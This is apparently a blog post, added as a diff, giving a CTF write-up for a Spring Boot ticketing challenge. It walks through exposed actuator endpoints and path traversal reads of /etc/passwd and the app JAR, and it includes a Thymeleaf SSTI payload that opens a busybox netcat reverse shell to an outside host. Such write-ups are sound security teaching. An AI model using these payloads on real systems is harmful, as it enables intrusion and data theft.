@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Track (3 challenges)</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>2-3-7</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Wills</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>1/10 - 3/10 - 5/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge is a custom ticket system application where users can buy a ticket via a POST request to <code>/ticket</code> with a name and a coupon code and view it later using an ID via a GET request to <code>/ticket?ticketId=&lt;ID&gt;</code> :
+<img alt="Web app pic" src="/images/unitedctf2025/cruise1.png" /></p>
+<p>To buy a ticket, we must have a valid coupon code. We can try to submit a ticket ID as well, but the application just crashes every time :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl 'https://united-cruiselines-eb1876f303.challenges.unitedctf.ca/ticket?ticketId=1234' -i
+HTTP/2 500 
+content-language: en-US
+content-type: text/html;charset=UTF-8
+date: Sat, 27 Sep 2025 17:15:09 GMT
+content-length: 0
+</code></pre>
+
+<h4 id="part-1-spring-boot-actuators">Part 1 - Spring Boot Actuators</h4>
+<p>We can try common attack payloads for stuff like SQL injection, but nothing works. Looking around in the main page's source code, we find an interesting comment left by the author :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl 'https://united-cruiselines-eb1876f303.challenges.unitedctf.ca/' | tail -n 25
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  6495    0  6495    0     0  32682      0 --:--:-- --:--:-- --:--:-- 32803
+
+&lt;/div&gt;
+&lt;!-- TODO : remove the /actuator endpoint before going into production --&gt;
+&lt;script&gt;
+    var modal = document.getElementById(&quot;modalContainer&quot;);
+    var span = document.getElementsByClassName(&quot;close&quot;)[0];
+
+    // Automatically open modal if ticket is present
+    if (modal &amp;&amp; modal.style.display !== &quot;none&quot;) {
+        modal.style.display = &quot;block&quot;;
+    }
+
+    span.onclick = function () {
+      modal.style.display = &quot;none&quot;;
+    }
+
+    window.onclick = function (event) {
+      if (event.target == modal) {
+        modal.style.display = &quot;none&quot;;
+      }
+    }
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- /app/resources/templates/index.html --&gt;
+</code></pre>
+
+<p>The presence of the <code>/actuator</code> path reveals that we are working with a Spring Boot application. Actuators are HTTP endpoints for Spring applications used for monitoring, debugging and analysis. We can view the list of these endpoints by visiting <code>/actuator</code>, the root endpoint :</p>
+<pre class="codehilite"><code class="language-json">{
+  &quot;_links&quot;: {
+    &quot;self&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator&quot;,
+      &quot;templated&quot;: false
+    },
+    &quot;beans&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/beans&quot;,
+      &quot;templated&quot;: false
+    },
+    &quot;health-path&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/health/{*path}&quot;,
+      &quot;templated&quot;: true
+    },
+    &quot;health&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/health&quot;,
+      &quot;templated&quot;: false
+    },
+    &quot;info&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/info&quot;,
+      &quot;templated&quot;: false
+    },
+    &quot;env-toMatch&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/env/{toMatch}&quot;,
+      &quot;templated&quot;: true
+    },
+    &quot;env&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/env&quot;,
+      &quot;templated&quot;: false
+    },
+    &quot;mappings&quot;: {
+      &quot;href&quot;: &quot;http://united-cruiselines-eb1876f303.challenges.unitedctf.ca/actuator/mappings&quot;,
+      &quot;templated&quot;: false
+    }
+  }
+}
+</code></pre>
+
+<p>Here's a basic explanation of what each of these endpoints show :</p>
+<ul>
+<li><strong>/beans</strong> : Spring-managed objects that could be used in the code</li>
+<li><strong>/info</strong> : Basic app information</li>
+<li><strong>/health</strong> : App health status </li>
+<li><strong>/env</strong> : The environment properties, like variables and configurations</li>
+<li><strong>/mappings</strong> : Mappings between URLs and the controller methods</li>
+</ul>
+<p>The endpoint that interests us the most is <code>/actuator/env</code>. It's where we find our first flag :</p>
+<pre class="codehilite"><code class="language-json">{
+      &quot;name&quot;: &quot;systemEnvironment&quot;,
+      &quot;properties&quot;: {
+        &quot;LANGUAGE&quot;: {
+          &quot;value&quot;: &quot;en_US:en&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;LANGUAGE\&quot;&quot;
+        },
+        &quot;PATH&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;PATH\&quot;&quot;
+        },
+        &quot;ticketboot.secondFlag&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;ticketboot.secondFlag\&quot;&quot;
+        },
+        &quot;JAVA_HOME&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;JAVA_HOME\&quot;&quot;
+        },
+        &quot;ANSIBLE_DEPLOY_DOMAIN_NAME&quot;: {
+          &quot;value&quot;: &quot;united-cruiselines-eb1876f303.challenges.unitedctf.ca&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;ANSIBLE_DEPLOY_DOMAIN_NAME\&quot;&quot;
+        },
+        &quot;LANG&quot;: {
+          &quot;value&quot;: &quot;en_US.UTF-8&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;LANG\&quot;&quot;
+        },
+        &quot;ticketboot.superSecretPassword&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;ticketboot.superSecretPassword\&quot;&quot;
+        },
+        &quot;HOSTNAME&quot;: {
+          &quot;value&quot;: &quot;6b339ecf2804&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;HOSTNAME\&quot;&quot;
+        },
+        &quot;LC_ALL&quot;: {
+          &quot;value&quot;: &quot;en_US.UTF-8&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;LC_ALL\&quot;&quot;
+        },
+        &quot;LD_LIBRARY_PATH&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;LD_LIBRARY_PATH\&quot;&quot;
+        },
+        &quot;JAVA_VERSION&quot;: {
+          &quot;value&quot;: &quot;******&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;JAVA_VERSION\&quot;&quot;
+        },
+        &quot;HOME&quot;: {
+          &quot;value&quot;: &quot;/root&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;HOME\&quot;&quot;
+        },
+        &quot;ticketboot.firstFlag&quot;: {
+          &quot;value&quot;: &quot;flag-w3lc0m3_t0_th3_t1ck3t_b00t_e058b670&quot;,
+          &quot;origin&quot;: &quot;System Environment Property \&quot;ticketboot.firstFlag\&quot;&quot;
+        }
+      }
+    }
+</code></pre>
+
+<h4 id="part-2-and-3-unintended-path-straight-to-ssti">Part 2 and 3 - Unintended path straight to SSTI</h4>
+<p>The next place we can look at is <code>/mappings</code>. :</p>
+<pre class="codehilite"><code class="language-json">{
+    &quot;predicate&quot;: &quot;{GET [/v3/api-docs], produces [application/json]}&quot;,
+    &quot;handler&quot;: &quot;org.springdoc.webmvc.api.OpenApiWebMvcResource#openapiJson(HttpServletRequest, String, Locale)&quot;,
+    &quot;details&quot;: {
+    &quot;handlerMethod&quot;: {
+        &quot;className&quot;: &quot;org.springdoc.webmvc.api.OpenApiWebMvcResource&quot;,
+            &quot;name&quot;: &quot;openapiJson&quot;,
+            &quot;descriptor&quot;: &quot;(Ljakarta/servlet/http/HttpServletRequest;Ljava/lang/String;Ljava/util/Locale;)[B&quot;
+        },
+    &quot;requestMappingConditions&quot;: {
+        &quot;consumes&quot;: [],
+        &quot;headers&quot;: [],
+        &quot;methods&quot;: [
+            &quot;GET&quot;
+        ],
+        &quot;params&quot;: [],
+        &quot;patterns&quot;: [
+            &quot;/v3/api-docs&quot;
+        ],
+        &quot;produces&quot;: [
+            {
+            &quot;mediaType&quot;: &quot;application/json&quot;,
+            &quot;negated&quot;: false
+            }
+        ]
+    }
+}
+            },
+{
+    &quot;predicate&quot;: &quot;{GET [/v3/api-docs.yaml], produces [application/vnd.oai.openapi]}&quot;,
+    &quot;handler&quot;: &quot;org.springdoc.webmvc.api.OpenApiWebMvcResource#openapiYaml(HttpServletRequest, String, Locale)&quot;,
+    &quot;details&quot;: {
+        &quot;handlerMethod&quot;: {
+            &quot;className&quot;: &quot;org.springdoc.webmvc.api.OpenApiWebMvcResource&quot;,
+            &quot;name&quot;: &quot;openapiYaml&quot;,
+            &quot;descriptor&quot;: &quot;(Ljakarta/servlet/http/HttpServletRequest;Ljava/lang/String;Ljava/util/Locale;)[B&quot;
+        },
+        &quot;requestMappingConditions&quot;: {
+            &quot;consumes&quot;: [],
+            &quot;headers&quot;: [],
+            &quot;methods&quot;: [
+                &quot;GET&quot;
+            ],
+            &quot;params&quot;: [],
+            &quot;patterns&quot;: [
+                &quot;/v3/api-docs.yaml&quot;
+            ],
+            &quot;produces&quot;: [
+                {
+                &quot;mediaType&quot;: &quot;application/vnd.oai.openapi&quot;,
+                &quot;negated&quot;: false
+                }
+            ]
+        }
+    }
+}
+</code></pre>
+
+<p>These endpoints hold the documentation for the API used by the application. There's also an endpoint with a graphical interface we can use (Swagger UI at <code>/swagger-ui/index.html</code>).  One observation we can make when visiting <code>/v3/api-docs</code> is that the POST request to <code>/ticket</code> seen previously to buy a ticket seems to be able to take another parameter (or at the very least, the object has another attribute) :</p>
+<pre class="codehilite"><code class="language-json">{
+  &quot;openapi&quot;: &quot;3.1.0&quot;,
+  &quot;info&quot;: {
+    &quot;title&quot;: &quot;TicketBoot Service Doc&quot;,
+    &quot;description&quot;: &quot;This service allows the users to create and view their tickets&quot;,
+    &quot;contact&quot;: {
+      &quot;name&quot;: &quot;Christopher Columbus&quot;
+    },
+    &quot;version&quot;: &quot;1.0.0&quot;
+  },
+  &quot;servers&quot;: [
+    {
+      &quot;url&quot;: &quot;http://localhost:8080&quot;,
+      &quot;description&quot;: &quot;Generated server url&quot;
+    }
+  ],
+  &quot;paths&quot;: {
+    &quot;/&quot;: {
+      &quot;get&quot;: {
+        &quot;tags&quot;: [
+          &quot;ticket-controller&quot;
+        ],
+        &quot;description&quot;: &quot;This operation displays the index file&quot;,
+        &quot;operationId&quot;: &quot;getIndex&quot;,
+        &quot;responses&quot;: {
+          &quot;200&quot;: {
+            &quot;description&quot;: &quot;OK&quot;,
+            &quot;content&quot;: {
+              &quot;*/*&quot;: {
+                &quot;schema&quot;: {
+                  &quot;type&quot;: &quot;string&quot;
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    &quot;/ticket&quot;: {
+      &quot;get&quot;: {
+        &quot;tags&quot;: [
+          &quot;ticket-controller&quot;
+        ],
+        &quot;description&quot;: &quot;This operation reads a ticket from the /tickets/{id} folder&quot;,
+        &quot;operationId&quot;: &quot;getTicket&quot;,
+        &quot;parameters&quot;: [
+          {
+            &quot;name&quot;: &quot;ticketId&quot;,
+            &quot;in&quot;: &quot;query&quot;,
+            &quot;required&quot;: true,
+            &quot;schema&quot;: {
+              &quot;type&quot;: &quot;string&quot;
+            }
+          }
+        ],
+        &quot;responses&quot;: {
+          &quot;200&quot;: {
+            &quot;description&quot;: &quot;OK&quot;,
+            &quot;content&quot;: {
+              &quot;*/*&quot;: {
+                &quot;schema&quot;: {
+                  &quot;type&quot;: &quot;string&quot;
+                }
+              }
+            }
+          }
+        }
+      },
+      &quot;post&quot;: {
+        &quot;tags&quot;: [
+          &quot;ticket-controller&quot;
+        ],
+        &quot;description&quot;: &quot;This operation creates a new ticket in the /tickets/{id} folder&quot;,
+        &quot;operationId&quot;: &quot;createTicket&quot;,
+        &quot;parameters&quot;: [
+          {
+            &quot;name&quot;: &quot;ticket&quot;,
+            &quot;in&quot;: &quot;query&quot;,
+            &quot;required&quot;: true,
+            &quot;schema&quot;: {
+              &quot;$ref&quot;: &quot;#/components/schemas/Ticket&quot;
+            }
+          }
+        ],
+        &quot;responses&quot;: {
+          &quot;201&quot;: {
+            &quot;description&quot;: &quot;Created&quot;,
+            &quot;content&quot;: {
+              &quot;*/*&quot;: {
+                &quot;schema&quot;: {
+                  &quot;type&quot;: &quot;string&quot;
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  &quot;components&quot;: {
+    &quot;schemas&quot;: {
+      &quot;Ticket&quot;: {
+        &quot;properties&quot;: {
+          &quot;id&quot;: { &lt;!---------------- Here!
+            &quot;type&quot;: &quot;string&quot;
+          },
+          &quot;name&quot;: {
+            &quot;type&quot;: &quot;string&quot;,
+            &quot;minLength&quot;: 1
+          },
+          &quot;couponCode&quot;: {
+            &quot;type&quot;: &quot;string&quot;
+          }
+        },
+        &quot;required&quot;: [
+          &quot;name&quot;
+        ]
+      }
+    }
+  }
+}
+</code></pre>
+
+<p>If we inject an <code>id</code> parameter inside this request, we get a new result :
+<img alt="Parameter Injection" src="/images/unitedctf2025/cruise2.png" /></p>
+<p>At this point, I was pretty confused. This was clearly meant to show us the second flag after we found a valid coupon code (more on that later), so it seemed I was doing something wrong. I tried crafting a ticket with a valid ID format here (<code>^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$</code>, found in the source code), but trying to view the ticket did nothing. </p>
+<p>We can see that the values we entered in the parameters are reflected back to us, so I tried a few common Server-Side Template Injection payloads for fun. To my surprise, this actually worked :
+<img alt="SSTI Testing" src="/images/unitedctf2025/cruise3.png" /></p>
+<p>The default templating engine for Spring Boot is <code>Thymeleaf</code>. We can find a working payload <a href="https://modzero.com/en/blog/spring_boot_ssti/">here</a>. It uses the <code>MethodUtils</code> class object to call helper methods that invoke an instance of Runtime to execute system commands   :
+<img alt="RCE with SSTI" src="/images/unitedctf2025/cruise4.png" /></p>
+<p>Since our command output is blind, we can just execute a reverse shell. We can use <a href="https://ngrok.com/">ngrok</a> to catch the connection back from an exposed server and forward it to a local port towards a netcat listener. Here's the final working payload :</p>
+<pre class="codehilite"><code>${&quot;&quot;.class.forName(&quot;org.apache.commons.lang3.reflect.MethodUtils&quot;).invokeMethod(&quot;&quot;.class.forName(&quot;org.apache.commons.lang3.reflect.MethodUtils&quot;).invokeStaticMethod(&quot;&quot;.class.forName(&quot;java.lang.Runtime&quot;),&quot;getRuntime&quot;),&quot;exec&quot;,&quot;busybox nc &lt;NGROK-IP&gt; &lt;NGROK-PORT&gt; -e sh&quot;)}
+</code></pre>
+
+<p><em>Note : I had to use <code>sh</code> here instead of <code>bash</code> since <code>bash</code> is not installed on the remote server (Yes, I wasted a great deal of time figuring this out)</em></p>
+<p>Receiving the connection on our host :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50702
+whoami
+root
+
+pwd
+/app
+
+ls
+TicketBoot.jar
+classes
+libs
+resources
+
+cd ..
+
+ls
+__cacert_entrypoint.sh
+app
+bin
+dev
+etc
+flag3.txt
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tickets
+tmp
+usr
+var
+
+cat flag3.txt
+flag-f1r5t_cl4s5_thym3_t0_p4rtyyy!!!?!_4a50fb71
+</code></pre>
+
+<p>As we saw from the <code>/actuator/env</code> endpoint, the second flag should be available inside the environment variables :</p>
+<pre class="codehilite"><code>env
+LANGUAGE=en_US:en
+HOSTNAME=6b339ecf2804
+LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
+SHLVL=1
+HOME=/root
+OLDPWD=/app
+ticketboot.firstFlag=flag-w3lc0m3_t0_th3_t1ck3t_b00t_e058b670
+JAVA_VERSION=jdk-17.0.16+8
+ticketboot.superSecretPassword=FIRST_CLASS_TICKETS_ca3e24ded9af48c01df28c830f192f95
+ticketboot.secondFlag=flag-c0ngr4tul4t10ns_h3r3_1s_y0ur_cru1s3_t1ck3t!!_feccc248
+PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ANSIBLE_DEPLOY_DOMAIN_NAME=united-cruiselines-eb1876f303.challenges.unitedctf.ca
+LANG=en_US.UTF-8
+LC_ALL=en_US.UTF-8
+JAVA_HOME=/opt/java/openjdk
+PWD=/
+</code></pre>
+
+<h4 id="part-2-intended-local-file-inclusion">Part 2 - Intended Local File Inclusion</h4>
+<p>After the CTF ended, I went back to the challenge and discovered why the <code>/ticket?ticketId=&lt;id&gt;</code> endpoint always crashed. While revisiting the API documentation, I realized I had missed an important detail before going down the unintended route :</p>
+<pre class="codehilite"><code class="language-json">post: {
+    &quot;tags&quot;: [
+          &quot;ticket-controller&quot;
+    ],
+    &quot;description&quot;: &quot;This operation creates a new ticket in the /tickets/{id} folder&quot;,
+    &quot;operationId&quot;: &quot;createTicket&quot;,
+    &quot;parameters&quot;: [
+        {
+        &quot;name&quot;: &quot;ticket&quot;,
+        &quot;in&quot;: &quot;query&quot;,
+        &quot;required&quot;: true,
+        &quot;schema&quot;: {
+            &quot;$ref&quot;: &quot;#/components/schemas/Ticket&quot;
+        }
+    }]
+</code></pre>
+
+<p>Creating a ticket also appears to be creating a file in the <code>/tickets/</code> folder with the ID being the filename. That must then mean that the <code>ticketId</code> parameter is expecting a filename. Using <code>../</code> sequences to go back into the directories (escaping <code>/app</code>) on the file system allows us to read local files :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl 'https://united-cruiselines-eb1876f303.challenges.unitedctf.ca/ticket?ticketId=../etc/passwd' | tail -n 25       
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4257    0  4257    0     0  17482      0 --:--:-- --:--:-- --:--:-- 17518
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+
+Here is the hex content:
+72 6F 6F 74 3A 78 3A 30 3A 30 3A 72 6F 6F 74 3A 2F 72 6F 6F 74 3A 2F 62 69 6E 2F 73 68 0A 62 69 6E 3A 78 3A 31 3A 31 3A 62 69 6E 3A 2F 62 69 6E 3A 2F 73 62 69 6E 
+&lt;SNIP&gt;
+6E 2F 6E 6F 6C 6F 67 69 6E 0A 6E 6F 62 6F 64 79 3A 78 3A 36 35 35 33 34 3A 36 35 35 33 34 3A 6E 6F 62 6F 64 79 3A 2F 3A 2F 73 62 69 6E 2F 6E 6F 6C 6F 67 69 6E 0A &lt;/span&gt;
+        &lt;/div&gt;
+    &lt;/p&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;!-- /app/resources/templates/index.html --&gt; 
+</code></pre>
+
+<p>Knowing the second flag is inside the environment variables, we can try to read the <code>/proc/self/environ</code> file, but get denied :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl 'https://united-cruiselines-eb1876f303.challenges.unitedctf.ca/ticket?ticketId=../proc/self/environ' | tail -n 25
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1439    0  1439    0     0   7669      0 --:--:-- --:--:-- --:--:--  7695
+    &lt;div id=&quot;waterReflectionMiddle&quot;&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;waterDistance&quot; &gt;&lt;/div&gt;
+&lt;div id=&quot;oceanRippleContainer&quot;&gt;&lt;/div&gt;
+&lt;div id=&quot;oceanRipple&quot;&gt;&lt;/div&gt;
+&lt;div style=&quot;position: relative; z-index: 9999;&quot;&gt;
+    &lt;h1 style=&quot;font-family: 'Comic Sans MS', cursive, sans-serif; color: #ff5722; text-align: center; padding-top: 10vh;&quot;&gt;
+        🏖 Oops! This Section Is Off-Limits 🏖
+    &lt;/h1&gt;
+    &lt;p style=&quot;font-family: 'Comic Sans MS', cursive, sans-serif; color: #333; text-align: center; font-size: 1.5em;&quot;&gt;
+        You're not supposed to be here... &lt;br&gt; Grab a 🍹, relax, and head back to the &lt;a href=&quot;/&quot; style=&quot;color: #2196f3; text-decoration: underline;&quot;&gt;main page&lt;/a&gt;.
+    &lt;/p&gt;
+    &lt;p&gt;
+        Here is your error :
+        &lt;div class=&quot;col-md-8&quot;&gt;
+            &lt;span&gt;&lt;/span&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;col-md-8&quot;&gt;
+            &lt;span&gt;You are not allowed to read this file! Get outta here!&lt;/span&gt;
+        &lt;/div&gt;
+    &lt;/p&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;!-- /app/resources/templates/index.html --&gt; 
+</code></pre>
+
+<p><em>We'll later find that the author put a check in place to stop participants from directly fetching the flags with the file read.</em></p>
+<p>Our next goal should be to get our hands on the application source code. From the comments left on the index page, we can conclude that the web root of the app is <code>/app</code>. Java applications are also commonly launched packaged as JAR (Java Archive) files, which contain all the code, dependencies and other components needed to launch the app.</p>
+<p>Thanks to the <code>/actuator/env</code> endpoint, we know the application name :</p>
+<pre class="codehilite"><code class="language-json">&quot;properties&quot;: {
+    &quot;spring.application.name&quot;: {
+    &quot;value&quot;: &quot;TicketBoot&quot;,
+    &quot;origin&quot;: &quot;class path resource [application.properties] - 1:25&quot;
+    }
+}
+</code></pre>
+
+<p>With a bit of trial an error, we're able to get our hands on the JAR file at <code>/app/TicketBoot.jar</code> :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cruise]
+└─$ curl 'https://united-cruiselines-eb1876f303.challenges.unitedctf.ca/ticket?ticketId=../app/TicketBoot.jar' -o TicketBoot.jar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  144M    0  144M    0     0  4636k      0 --:--:--  0:00:31 --:--:-- 8178k
+
+┌──(kali㉿kali)-[~/united/cruise]
+└─$ ls
+TicketBoot.jar
+</code></pre>
+
+<p>Since we get a part of the HTTP response back, we'll need to carve out the actual JAR file out of the response. Thankfully, the author was kind enough to also give us the hex-encoded version of the file, which we can then decode into bytes later. The entire JAR file hex is a bit too long to copy and paste though, so we can just make ChatGPT write us a script that will parse the requests contents in between the <code>Here is the hex content:</code> and the <code>&lt;/span&gt;</code> tag :</p>
+<pre class="codehilite"><code class="language-python">#!/usr/bin/env python3
+import re
+import sys
+
+if len(sys.argv) != 3:
+    print(&quot;Usage: hex_extract.py input.html output.bin&quot;)
+    sys.exit(1)
+
+infile, outfile = sys.argv[1], sys.argv[2]
+
+# Read the HTML as text
+with open(infile, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:
+    html = f.read()
+
+# Extract everything after marker and before &lt;/span&gt;
+match = re.search(r'Here is the hex content:(.*?)&lt;/span&gt;', html, re.S | re.I)
+if not match:
+    print(&quot;No hex block found between marker and &lt;/span&gt;.&quot;)
+    sys.exit(1)
+
+hex_block = match.group(1)
+
+# Keep only hex digits (remove spaces, newlines, punctuation)
+clean = re.sub(r'[^0-9A-Fa-f]', '', hex_block)
+
+if len(clean) % 2 != 0:
+    # fix odd number of characters
+    clean = clean[:-1]
+
+# Convert hex → bytes
+data = bytes.fromhex(clean)
+
+# Save to file
+with open(outfile, &quot;wb&quot;) as f:
+    f.write(data)
+
+print(f&quot;[+] Wrote {len(data)} bytes to {outfile}&quot;)
+</code></pre>
+
+<p>This allows a clean unzip of the JAR file :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/cruise]
+└─$ python3 extract.py TicketBoot.jar TicketFixed.jar 
+[+] Wrote 31554974 bytes to TicketFixed.jar
+
+┌──(kali㉿kali)-[~/united/cruise]
+└─$ file TicketFixed.jar     
+TicketFixed.jar: Zip archive data, at least v2.0 to extract, compression method=deflate
+
+┌──(kali㉿kali)-[~/united/cruise]
+└─$ unzip TicketFixed.jar     
+Archive:  TicketFixed.jar
+   creating: META-INF/
+  inflating: META-INF/MANIFEST.MF    
+   creating: META-INF/services/
+  inflating: META-INF/services/java.nio.file.spi.FileSystemProvider  
+   creating: org/
+   creating: org/springframework/
+   creating: org/springframework/boot/
+   creating: org/springframework/boot/loader/
+   creating: org/springframework/boot/loader/jar/
+  inflating: org/springframework/boot/loader/jar/JarEntriesStream$InputStreamSupplier.class
+  &lt;SNIP&gt;
+</code></pre>
+
+<p>We can find the main class of the application at <code>BOOT-INF/classes/com/united/TicketBoot/TicketBootApplication.class</code>. Since this is Java compiled bytecode at this point, we'll need to decompile it back into standard Java. There are multiple ways to do this, like using <a href="https://www.benf.org/other/cfr/">CFR</a>, a Java decompiler that can easily be ran from the command line :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/…/classes/com/united/TicketBoot]
+└─$ java -jar ~/Downloads/cfr-0.152.jar TicketBootApplication.class &gt; TicketBootApplication.java 
+
+┌──(kali㉿kali)-[~/…/classes/com/united/TicketBoot]
+└─$ ls            
+springconfig  ticket  TicketBootApplication.class  TicketBootApplication.java
+</code></pre>
+
+<p>The rest of the classes are in the <code>/ticket</code> directory. We find the coupon we were looking for inside the decompiled <code>TicketController.class</code> class :</p>
+<pre class="codehilite"><code class="language-java">@Controller
+public class TicketController {
+    @Autowired
+    private TicketService ticketService;
+    @Value(value=&quot;${ticketboot.secondFlag}&quot;)
+    private String FLAG2;
+    private final String COUPON_CODE = &quot;FREE_CRUISE_TICKETS_a0e5fce92e91b0d1ba55dcc10732d85d&quot;;
+
+    @GetMapping(value={&quot;/&quot;})
+    @ResponseStatus(value=HttpStatus.OK)
+    public String getIndex(Model model) {
+        model.addAttribute(&quot;ticket&quot;, (Object)new Ticket());
+        return &quot;index&quot;;
+    }
+
+    @PostMapping(value={&quot;/ticket&quot;})
+    @ResponseStatus(value=HttpStatus.CREATED)
+    public String createTicket(Model model, @Valid @ModelAttribute Ticket ticket, BindingResult result) {
+        if (result.hasErrors()) {
+            return &quot;index&quot;;
+        }
+        if (&quot;FREE_CRUISE_TICKETS_a0e5fce92e91b0d1ba55dcc10732d85d&quot;.equals(ticket.getCouponCode())) {
+            ticket.setFlag(this.FLAG2);
+            Ticket response = this.ticketService.createTicket(ticket);
+            model.addAttribute(&quot;ticketId&quot;, (Object)ticket.getId());
+            model.addAttribute(&quot;ticket&quot;, (Object)new Ticket());
+        } else {
+            result.rejectValue(&quot;couponCode&quot;, &quot;invalid.coupon&quot;, &quot;Invalid coupon code!&quot;);
+        }
+        return &quot;index&quot;;
+    }
+
+    @GetMapping(value={&quot;/ticket&quot;})
+    @ResponseStatus(value=HttpStatus.OK)
+    public String getTicket(Model model, @RequestParam String ticketId) {
+        Ticket ticket = this.ticketService.getTicket(ticketId);
+        model.addAttribute(&quot;ticket&quot;, (Object)ticket);
+        return &quot;index&quot;;
+    }
+
+    @ExceptionHandler(value={Exception.class})
+    public String handleErrors(Exception ex, Model model) {
+        model.addAttribute(&quot;errorMessage&quot;, (Object)ex.getMessage());
+        return &quot;error&quot;;
+    }
+
+    @ModelAttribute
+    public void hideShip(Model model, @CookieValue(name=&quot;hideShip&quot;, defaultValue=&quot;false&quot;) String hideShipCookie) {
+        model.addAttribute(&quot;hideShip&quot;, (Object)&quot;true&quot;.equalsIgnoreCase(hideShipCookie));
+    }
+}
+</code></pre>
+
